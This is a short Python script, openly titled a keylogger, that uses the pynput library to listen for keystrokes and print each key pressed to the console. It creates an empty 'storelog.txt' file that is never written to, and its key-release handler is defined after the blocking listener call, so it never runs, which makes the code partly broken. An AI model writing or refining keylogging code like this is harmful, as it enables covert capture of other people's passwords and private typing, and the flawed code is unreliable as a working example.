#Keylogger/ ScecretKeys
#This program allows you to log keystrokes.
from pynput import keyboard
from datetime import datetime

f=open('storelog.txt','a')
f.close()

print ('Keylogger Started: ' + str(datetime.now()))

def on_press(key):
    try:
        print('{0}'.format(key.char))
    except AttributeError:
        print('\n Special key {0} pressed'.format(key))
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        return False
